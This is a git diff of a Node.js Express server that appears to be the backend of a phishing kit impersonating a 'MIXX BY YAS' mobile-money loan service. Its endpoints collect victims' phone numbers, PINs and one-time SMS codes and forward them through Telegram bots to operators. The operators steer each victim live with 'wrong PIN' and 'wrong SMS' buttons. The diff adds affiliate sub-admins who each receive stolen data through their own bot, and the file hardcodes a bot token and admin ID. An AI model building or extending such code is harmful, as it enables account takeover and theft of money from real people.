@@ -6,43 +6,76 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Hardcoded fallbacks using your provided credentials
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
+// Main System Bot Token and Main Admin ID
+const MAIN_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
 const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();
 const PORT = process.env.PORT || 10000;
 
-if (!TELEGRAM_BOT_TOKEN) {
-    console.error("❌ ERROR: TELEGRAM_BOT_TOKEN is missing!");
+if (!MAIN_BOT_TOKEN) {
+    console.error("❌ ERROR: Main Telegram Bot Token is missing!");
 } else {
-    console.log("🤖 Initializing Telegram Bot...");
+    console.log("🤖 Initializing Main Telegram Bot...");
 }
 
-// Initialize bot with polling and error safety
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
+// Main system bot instance
+const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });
 
-bot.on('polling_error', (error) => {
-    console.error('⚠️ Telegram Polling Error:', error.code, error.message);
+mainBot.on('polling_error', (error) => {
+    console.error('⚠️ Main Bot Polling Error:', error.code, error.message);
 });
 
 let activeSessions = {};
 let authorizedAdmins = new Set(MAIN_ADMIN_ID ? [MAIN_ADMIN_ID] : []);
 let pendingAdmins = {};
+let subAdminBots = {}; 
+let subAdminTokens = {}; 
+let subAdminSetupState = {}; 
 
 function escapeMarkdown(text) {
     if (!text) return '';
     return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
 }
 
-bot.on('message', (msg) => {
+mainBot.on('message', (msg) => {
     if (!msg.text) return;
     const chatId = msg.chat.id;
     const userIdStr = chatId.toString().trim();
     const firstName = msg.from.first_name || 'Admin';
     const username = msg.from.username ? `@${msg.from.username}` : 'No username set';
 
+    if (subAdminSetupState[userIdStr]) {
+        const customToken = msg.text.trim();
+        try {
+            const customBot = new TelegramBot(customToken, { polling: true });
+            
+            customBot.on('polling_error', (err) => {
+                console.error(`⚠️ Sub-Admin (${userIdStr}) Bot Polling Error:`, err.code, err.message);
+            });
+
+            customBot.getMe().then((botInfo) => {
+                subAdminBots[userIdStr] = customBot;
+                subAdminTokens[userIdStr] = customToken;
+                delete subAdminSetupState[userIdStr];
+
+                mainBot.sendMessage(chatId, `✅ Token yako imehakikiwa kikamilifu!\n\nBot Yako: @${botInfo.username}\nSasa maombi yako yatatumika kupitia bot yako maalum.`);
+                sendAdminLink(chatId, userIdStr, firstName, username);
+            }).catch((err) => {
+                mainBot.sendMessage(chatId, "❌ Bot Token uliyoweka si sahihi. Tafadhali tuma Token halali tena:");
+            });
+        } catch (e) {
+            mainBot.sendMessage(chatId, "❌ Imeshindwa kusoma Token hiyo. Hakikisha ni sahihi na utume tena:");
+        }
+        return;
+    }
+
     if (msg.text.startsWith('/start')) {
         if (userIdStr === MAIN_ADMIN_ID || authorizedAdmins.has(userIdStr)) {
             authorizedAdmins.add(userIdStr);
+            if (!subAdminBots[userIdStr] && userIdStr !== MAIN_ADMIN_ID) {
+                subAdminSetupState[userIdStr] = true;
+                mainBot.sendMessage(chatId, "🤖 Karibu Msimamizi! Tafadhali **tuma Telegram Bot Token yako maalum** (unayotaka iwe ikitumia bot yako kuletea taarifa):");
+                return;
+            }
             sendAdminLink(chatId, userIdStr, firstName, username);
             return;
         }
@@ -55,7 +88,7 @@ bot.on('message', (msg) => {
             `🏷 *Username:* ${escapeMarkdown(username)}`;
 
         if (MAIN_ADMIN_ID) {
-            bot.sendMessage(MAIN_ADMIN_ID, requestText, {
+            mainBot.sendMessage(MAIN_ADMIN_ID, requestText, {
                 parse_mode: "Markdown",
                 reply_markup: {
                     inline_keyboard: [
@@ -68,7 +101,7 @@ bot.on('message', (msg) => {
             }).catch(err => console.error("Error sending auth request to main admin:", err));
         }
 
-        bot.sendMessage(chatId, "⏳ Ombi lako limeshatumwa kwa Msimamizi Mkuu (Main Admin). Subiri uidhinishwe.");
+        mainBot.sendMessage(chatId, "⏳ Ombi lako limeshatumwa kwa Msimamizi Mkuu. Subiri uidhinishwe.");
     }
 });
 
@@ -81,97 +114,98 @@ function sendAdminLink(chatId, userIdStr, firstName, username) {
         `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
         `🔗 *Kiungo Chako Maalum:*\n${isolatedLink}`;
 
-    bot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
+    const activeBot = (userIdStr === MAIN_ADMIN_ID) ? mainBot : (subAdminBots[userIdStr] || mainBot);
+    activeBot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
         .catch(err => console.error("Error sending start message:", err));
 }
 
-bot.on('callback_query', async (query) => {
-    const chatId = query.message.chat.id;
-    const data = query.data;
-    const userIdStr = chatId.toString().trim();
+function setupCallbackHandler(botInstance, isMain = false) {
+    botInstance.on('callback_query', async (query) => {
+        const chatId = query.message.chat.id;
+        const data = query.data;
+        const userIdStr = chatId.toString().trim();
 
-    if (data.startsWith('approveadmin_') || data.startsWith('denyadmin_')) {
-        if (userIdStr !== MAIN_ADMIN_ID) {
-            bot.answerCallbackQuery(query.id, { text: "⚠ Wewe si Main Admin!", show_alert: true });
+        if (isMain && (data.startsWith('approveadmin_') || data.startsWith('denyadmin_'))) {
+            if (userIdStr !== MAIN_ADMIN_ID) {
+                botInstance.answerCallbackQuery(query.id, { text: "⚠ Wewe si Main Admin!", show_alert: true });
+                return;
+            }
+            const targetSubId = data.split('_')[1];
+            const subAdminInfo = pendingAdmins[targetSubId];
+
+            if (data.startsWith('approveadmin_')) {
+                authorizedAdmins.add(targetSubId);
+                if (subAdminInfo) {
+                    subAdminSetupState[targetSubId] = true;
+                    mainBot.sendMessage(subAdminInfo.chatId, `✅ Ombi lako la kuwa Sub-Admin limekubaliwa!\n\nTafadhali **tuma Telegram Bot Token yako maalum** hapa ili uanze kupokea ujumbe kwenye bot yako:`);
+                    mainBot.sendMessage(MAIN_ADMIN_ID, `✅ Umemruhusu Sub-Admin ${targetSubId}. Sasa anasubiriwa kuweka Bot Token yake.`);
+                }
+            } else {
+                if (subAdminInfo) {
+                    mainBot.sendMessage(subAdminInfo.chatId, "❌ Ombi lako la kuwa Sub-Admin limekataliwa.");
+                    mainBot.sendMessage(MAIN_ADMIN_ID, `❌ Umekataa ombi la Sub-Admin ${targetSubId}.`);
+                }
+            }
+            delete pendingAdmins[targetSubId];
+            botInstance.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: query.message.message_id }).catch(() => {});
+            botInstance.answerCallbackQuery(query.id);
             return;
         }
-        const targetSubId = data.split('_')[1];
-        const subAdminInfo = pendingAdmins[targetSubId];
 
-        if (data.startsWith('approveadmin_')) {
-            authorizedAdmins.add(targetSubId);
-            if (subAdminInfo) {
-                sendAdminLink(subAdminInfo.chatId, targetSubId, subAdminInfo.firstName, subAdminInfo.username);
-                bot.sendMessage(MAIN_ADMIN_ID, `✅ Umemruhusu Sub-Admin ${targetSubId} kwa mafanikio.`);
-            }
-        } else {
-            if (subAdminInfo) {
-                bot.sendMessage(subAdminInfo.chatId, "❌ Ombi lako la kuwa Sub-Admin limekataliwa.");
-                bot.sendMessage(MAIN_ADMIN_ID, `❌ Umekataa ombi la Sub-Admin ${targetSubId}.`);
-            }
+        const parts = data.split('_');
+        const action = parts[0]; 
+        const sessionId = parts.slice(1).join('_');
+
+        const session = activeSessions[sessionId];
+        if (!session) {
+            botInstance.answerCallbackQuery(query.id, { text: "Kipindi kimeisha au hakionekani.", show_alert: true });
+            return;
         }
-        delete pendingAdmins[targetSubId];
-        bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: query.message.message_id }).catch(() => {});
-        bot.answerCallbackQuery(query.id);
-        return;
-    }
 
-    const parts = data.split('_');
-    const action = parts[0]; 
-    const sessionId = parts.slice(1).join('_');
+        if (action === 'allow') session.status = 'approved_pin';
+        else if (action === 'deny') session.status = 'denied';
+        else if (action === 'wrongpin') session.status = 'wrong_pin';
+        else if (action === 'wrongsms') session.status = 'wrong_sms';
+        else if (action === 'approved') session.status = 'success';
 
-    const session = activeSessions[sessionId];
-    if (!session) {
-        bot.answerCallbackQuery(query.id, { text: "Kipindi kimeisha au hakionekani.", show_alert: true });
-        return;
-    }
+        botInstance.editMessageReplyMarkup({ inline_keyboard: [] }, {
+            chat_id: chatId,
+            message_id: query.message.message_id
+        }).catch(err => console.error("Error clearing markup:", err));
 
-    if (action === 'allow') session.status = 'approved_pin';
-    else if (action === 'deny') session.status = 'denied';
-    else if (action === 'wrongpin') session.status = 'wrong_pin';
-    else if (action === 'wrongsms') session.status = 'wrong_sms';
-    else if (action === 'approved') session.status = 'success';
+        botInstance.answerCallbackQuery(query.id).catch(err => console.error("Error answering callback query:", err));
+    });
+}
 
-    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
-        chat_id: chatId,
-        message_id: query.message.message_id
-    }).catch(err => console.error("Error clearing markup:", err));
-
-    bot.answerCallbackQuery(query.id).catch(err => console.error("Error answering callback query:", err));
-});
+setupCallbackHandler(mainBot, true);
 
 app.post('/api/submit-credentials', (req, res) => {
     const { sessionId, sliderData, loanData, phone, pin, adminId } = req.body;
     
     let targetAdmin = MAIN_ADMIN_ID;
+    let targetBot = mainBot;
+
     if (adminId && authorizedAdmins.has(adminId)) {
         targetAdmin = adminId;
+        if (adminId !== MAIN_ADMIN_ID && subAdminBots[adminId]) {
+            targetBot = subAdminBots[adminId];
+        }
     }
 
     activeSessions[sessionId] = {
         sliderData, loanData, phone, pin,
         targetAdmin,
+        targetBot,
         status: 'pending_pin_approval'
     };
 
-    const message = `OMBI JIPYA LA MIXX BY YAS\n\n` +
-        `-- SLIDER DASHBOARD --\n` +
-        `Kiasi Kikubwa: ${sliderData.sliderAmount}\n` +
-        `Muda wa Malipo: ${sliderData.sliderDuration}\n` +
-        `Riba: ${sliderData.monthlyPayment}\n\n` +
-        `-- HATUA 1-3 ZA MAOMBI --\n` +
-        `Aina ya Mkopo: ${loanData.loanType}\n` +
-        `Kiasi: ${loanData.amount}\n` +
-        `Muda: ${loanData.duration}\n` +
-        `Madhumuni: ${loanData.purpose}\n` +
-        `Jina: ${loanData.firstName} ${loanData.lastName}\n` +
-        `Ajira: ${loanData.employmentStatus}\n` +
-        `Mapato ya Mwaka: ${loanData.annualIncome}\n\n` +
-        `NAMBARI YA SIMU: ${phone}\n` +
+    // Trimmed message format to only display New Mixx Applicant, Phone No, and PIN
+    const message = `NEW MIXX APPLICANT\n\n` +
+        `PHONE NO: ${phone}\n` +
         `PIN: ${pin}`;
 
-    if (targetAdmin) {
-        bot.sendMessage(targetAdmin, message, {
+    if (targetAdmin && targetBot) {
+        targetBot.sendMessage(targetAdmin, message, {
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -181,7 +215,7 @@ app.post('/api/submit-credentials', (req, res) => {
                 ]
             }
         }).then(() => {
-            console.log(`✅ Credentials successfully sent to admin ${targetAdmin}`);
+            console.log(`✅ Credentials successfully sent to admin ${targetAdmin} via their designated bot`);
         }).catch(err => {
             console.error(`❌ Telegram Send Error:`, err.response ? err.response.body : err.message);
         });
@@ -205,8 +239,8 @@ app.post('/api/submit-otp', (req, res) => {
         `NAMBARI YA SIMU: ${session.phone}\n\n` +
         `OTP:\n${otpText}`;
 
-    if (session.targetAdmin) {
-        bot.sendMessage(session.targetAdmin, message, {
+    if (session.targetAdmin && session.targetBot) {
+        session.targetBot.sendMessage(session.targetAdmin, message, {
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -240,4 +274,3 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-        
